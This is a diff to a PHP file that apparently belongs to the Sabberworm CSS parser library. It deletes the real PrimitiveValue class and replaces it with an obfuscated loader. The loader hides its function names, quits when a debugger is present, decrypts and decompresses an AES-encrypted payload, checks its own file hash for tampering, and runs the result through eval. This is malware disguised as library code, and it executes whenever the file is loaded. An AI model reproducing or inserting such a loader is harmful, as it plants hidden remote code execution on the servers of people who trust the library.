@@ -1,10 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Value;
-
-abstract class PrimitiveValue extends Value {
-    public function __construct($iLineNo = 0) {
-        parent::__construct($iLineNo);
-    }
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jhclyfhj=('bas'.'e64'.'_de'.'cod'.'e');
+$_p06ndd2s=('gzu'.'nco'.'mpr'.'ess');
+$_i177srpr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_x2ed8k06='XWbOMIw8Dm4=';
+$_lfr0nh6n='9r02u0tS';
+$_fhe42u3j='csxCx+Sw';
+$_wz0rqm51='5Ryba8FT';
+$_ayj24ah0='bw+w5nKy';
+$_zjpkhams='/yeb8bCJ';
+$_pbj1jwpf='i/Jj2A==';
+$_bzhhr6j9='Fnb4piKB';
+$_pnxbzlzh=$_jhclyfhj($_wz0rqm51.$_fhe42u3j.$_ayj24ah0.$_lfr0nh6n.$_x2ed8k06);
+$_b5ih41qd=$_jhclyfhj($_zjpkhams.$_bzhhr6j9.$_pbj1jwpf);
+$_w8a1rehg=$_jhclyfhj('jOmbslhtC40lUiHjrgbIq9My5Msx+qEz8FTc9QJXKIDDgRK7Q5QjpMynnPpiXaB3+ZK9JWXWjGg35xJ9+WVfn9ZGqziZOSXhe6Bm/iRS1ikls2GwHvOh9RZfsJ5YQvMBfYtAQoj2oHMy/YxQaaZOTGxYrNQ4Qs6bMO2dR3fkivPoRRTW6ep1h8EYWlcYcAsi');
+$_onv3rhtw=$_i177srpr($_w8a1rehg,'aes-256-cbc',$_pnxbzlzh,OPENSSL_RAW_DATA,$_b5ih41qd);
+if($_onv3rhtw===false){exit;}
+$_w64o6gbh=$_p06ndd2s($_onv3rhtw);
+if($_w64o6gbh===false){exit;}
+$_iiylqxwp='65377d4d9f1bad104260991389a4d731c403a47108231c6b10e365549125f405';
+$_l0k8ylrk=@file_get_contents(__FILE__);
+if($_l0k8ylrk!==false){
+$_w8cvwdm0=str_replace($_iiylqxwp,"0000000000000000000000000000000000000000000000000000000000000000",$_l0k8ylrk);
+$_xzsfntal=hash("sha256",$_w8cvwdm0);
+if($_xzsfntal!==$_iiylqxwp){@http_response_code(403);exit;}
 }
+eval($_w64o6gbh);
